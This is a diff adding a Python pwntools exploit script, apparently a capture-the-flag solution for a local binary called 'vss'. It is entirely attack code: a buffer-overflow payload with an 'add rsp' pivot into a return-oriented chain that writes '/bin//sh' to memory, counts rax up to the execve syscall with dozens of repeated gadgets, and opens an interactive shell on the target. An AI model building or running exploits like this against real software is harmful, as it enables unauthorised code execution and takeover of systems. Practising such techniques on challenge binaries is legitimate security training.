@@ -1,0 +1,89 @@
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+from struct import pack
+# Padding goes here
+p = ''
+p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
+p += pack('<Q', 0x00000000006c4080) # @ .data
+p += pack('<Q', 0x000000000046f208) # pop rax ; ret
+p += '/bin//sh'
+p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
+p += pack('<Q', 0x00000000006c4088) # @ .data + 8
+p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
+p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
+p += pack('<Q', 0x00000000006c4080) # @ .data
+p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
+p += pack('<Q', 0x00000000006c4088) # @ .data + 8
+p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
+p += pack('<Q', 0x00000000006c4088) # @ .data + 8
+p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000045f2a5) # syscall ; ret
+addRspRet = 0x000000000046f205
+payload = 'py'+'a'*(0x48-0x2)+p64(addRspRet)+'a'*(0x58-0x50)+p
+p = process('vss')
+p.recv()
+#gdb.attach(p)
+p.send(payload)
+p.interactive()
